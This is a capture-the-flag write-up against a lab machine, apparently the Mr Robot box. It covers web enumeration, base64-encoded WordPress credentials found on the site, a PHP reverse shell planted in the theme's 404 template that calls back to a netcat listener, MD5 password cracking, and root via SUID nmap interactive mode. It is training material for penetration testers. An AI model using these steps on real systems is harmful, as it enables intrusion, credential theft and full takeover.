## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.103.56
# HOSTNAME // Found Post Initial foothold
linux
# OPERATING SYSTEM  // Found Post Initial foothold
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
# CREDENTIALS   // Found Post Initial foothold
elliot:ER28-0652
robot:abcdefghijklmnopqrstuvwxyz
```
## OPEN PORTS DETAILS
```bash
80/tcp  open   http     syn-ack ttl 63 Apache httpd
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd
```
# ENUMERATION
## PORT 80 443 
```bash
# Nmap NSE Script
sudo nmap -p 80,443 --script=http-enum -oN nmap/script-http-enum $ip
80/tcp  open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
443/tcp open  https
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder

# Fuzzing
sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -b 403,404 -o fuzz/gobuster-common.txt -e -t 20 -u $url/
http://10.10.103.56/0                   [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/0/][0m
http://10.10.103.56/admin               [36m (Status: 301)[0m [Size: 234][34m [--> http://10.10.103.56/admin/][0m
http://10.10.103.56/atom                [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/feed/atom/][0m
http://10.10.103.56/audio               [36m (Status: 301)[0m [Size: 234][34m [--> http://10.10.103.56/audio/][0m
http://10.10.103.56/blog                [36m (Status: 301)[0m [Size: 233][34m [--> http://10.10.103.56/blog/][0m
http://10.10.103.56/css                 [36m (Status: 301)[0m [Size: 232][34m [--> http://10.10.103.56/css/][0m
http://10.10.103.56/dashboard           [36m (Status: 302)[0m [Size: 0][34m [--> http://10.10.103.56/wp-admin/][0m
http://10.10.103.56/favicon.ico         [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/feed                [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/feed/][0m
http://10.10.103.56/images              [36m (Status: 301)[0m [Size: 235][34m [--> http://10.10.103.56/images/][0m
http://10.10.103.56/image               [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/image/][0m
http://10.10.103.56/Image               [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/Image/][0m
http://10.10.103.56/index.html          [32m (Status: 200)[0m [Size: 1188]
http://10.10.103.56/index.php           [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/][0m
http://10.10.103.56/js                  [36m (Status: 301)[0m [Size: 231][34m [--> http://10.10.103.56/js/][0m
http://10.10.103.56/license             [32m (Status: 200)[0m [Size: 309]
http://10.10.103.56/intro               [32m (Status: 200)[0m [Size: 516314]
http://10.10.103.56/login               [36m (Status: 302)[0m [Size: 0][34m [--> http://10.10.103.56/wp-login.php][0m
http://10.10.103.56/page1               [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/][0m
http://10.10.103.56/readme              [32m (Status: 200)[0m [Size: 64]
http://10.10.103.56/rdf                 [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/feed/rdf/][0m
http://10.10.103.56/robots              [32m (Status: 200)[0m [Size: 41]
http://10.10.103.56/robots.txt          [32m (Status: 200)[0m [Size: 41]
http://10.10.103.56/rss                 [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/feed/][0m
http://10.10.103.56/rss2                [36m (Status: 301)[0m [Size: 0][34m [--> http://10.10.103.56/feed/][0m
http://10.10.103.56/sitemap             [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/sitemap.xml         [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/video               [36m (Status: 301)[0m [Size: 234][34m [--> http://10.10.103.56/video/][0m
http://10.10.103.56/wp-admin            [36m (Status: 301)[0m [Size: 237][34m [--> http://10.10.103.56/wp-admin/][0m
http://10.10.103.56/wp-content          [36m (Status: 301)[0m [Size: 239][34m [--> http://10.10.103.56/wp-content/][0m
http://10.10.103.56/wp-includes         [36m (Status: 301)[0m [Size: 240][34m [--> http://10.10.103.56/wp-includes/][0m
http://10.10.103.56/wp-config           [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/wp-cron             [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/wp-links-opml       [32m (Status: 200)[0m [Size: 227]
http://10.10.103.56/wp-login            [32m (Status: 200)[0m [Size: 2664]
http://10.10.103.56/wp-load             [32m (Status: 200)[0m [Size: 0]
http://10.10.103.56/wp-mail             [31m (Status: 500)[0m [Size: 3064]
http://10.10.103.56/wp-settings         [31m (Status: 500)[0m [Size: 0]
http://10.10.103.56/wp-signup           [36m (Status: 302)[0m [Size: 0][34m [--> http://10.10.103.56/wp-login.php?action=register][0m
http://10.10.103.56/xmlrpc.php          [33m (Status: 405)[0m [Size: 42]
http://10.10.103.56/xmlrpc              [33m (Status: 405)[0m [Size: 42]

# Found Creds
curl http://10.10.103.56/license
ZWxsaW90OkVSMjgtMDY1Mgo=

echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
elliot:ER28-0652

# Using creds to login to http://10.10.103.56/wp-login.php
- Works !!!
```
## INITIAL FOOTHOLD
```bash
# WORDPRESS RCE METHOD - Edit Themes
Modifying a php from the theme used (admin credentials needed)  
  
Appearance -> Editor -> 404 Template (at the right)  
Change the content of 404 Template on Twenty Fifteen Theme for a php shell  

- Payload
cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.php

- Edit the lhost to our IP
- copy the contents of the file and paste and update 

- Listener
sudo nc -nvlp 8888

- Trigger Shell
curl http://10.10.103.56/wp-content/themes/twentyfifteen/404.php

sudo nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.11.127.94] from (UNKNOWN) [10.10.103.56] 40525
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 11:18:41 up 36 min,  0 users,  load average: 0.00, 0.11, 0.61
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
## PRIVILEGE ESCALATION
```bash
daemon@linux:/$ cd /home/robot/
daemon@linux:/home/robot$ ll
total 16K
4.0K -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
4.0K -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
4.0K drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
4.0K drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
daemon@linux:/home/robot$ cat password.raw-md5 
robot:c3fcd3d76192e4007dfb496cca67e13b

- Crack using  crackstation.com
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
robot:abcdefghijklmnopqrstuvwxyz
su robot
Password: abcdefghijklmnopqrstuvwxyz

# SUID
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/nmap

- Reference GTFOBINS
robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# whoami
root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Tue Mar 18 16:15:11 2025 as: /usr/lib/nmap/nmap -p 22,80,443 -sC -sV -vv -oN nmap/scan-script-version 10.10.103.56
Nmap scan report for 10.10.103.56
Host is up, received syn-ack ttl 63 (0.17s latency).
Scanned at 2025-03-18 16:15:13 IST for 22s

PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 63
80/tcp  open   http     syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp open   ssl/http syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
| SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
| -----BEGIN CERTIFICATE-----
| MIIBqzCCARQCCQCgSfELirADCzANBgkqhkiG9w0BAQUFADAaMRgwFgYDVQQDDA93
| d3cuZXhhbXBsZS5jb20wHhcNMTUwOTE2MTA0NTAzWhcNMjUwOTEzMTA0NTAzWjAa
| MRgwFgYDVQQDDA93d3cuZXhhbXBsZS5jb20wgZ8wDQYJKoZIhvcNAQEBBQADgY0A
| MIGJAoGBANlxG/38e8Dy/mxwZzBboYF64tu1n8c2zsWOw8FFU0azQFxv7RPKcGwt
| sALkdAMkNcWS7J930xGamdCZPdoRY4hhfesLIshZxpyk6NoYBkmtx+GfwrrLh6mU
| yvsyno29GAlqYWfffzXRoibdDtGTn9NeMqXobVTTKTaR0BGspOS5AgMBAAEwDQYJ
| KoZIhvcNAQEFBQADgYEASfG0dH3x4/XaN6IWwaKo8XeRStjYTy/uBJEBUERlP17X
| 1TooZOYbvgFAqK8DPOl7EkzASVeu0mS5orfptWjOZ/UWVZujSNj7uu7QR4vbNERx
| ncZrydr7FklpkIN5Bj8SYc94JI9GsrHip4mpbystXkxncoOVESjRBES/iatbkl0=
|_-----END CERTIFICATE-----

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 18 16:15:35 2025 -- 1 IP address (1 host up) scanned in 24.13 seconds
```
## NMAP HTTP-ENUM
```bash
# Nmap 7.95 scan initiated Tue Mar 18 16:21:05 2025 as: /usr/lib/nmap/nmap -p 80,443 --script=http-enum -oN nmap/script-http-enum 10.10.103.56
Nmap scan report for 10.10.103.56
Host is up (0.17s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
443/tcp open  https
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder

# Nmap done at Tue Mar 18 16:25:02 2025 -- 1 IP address (1 host up) scanned in 236.53 seconds
```

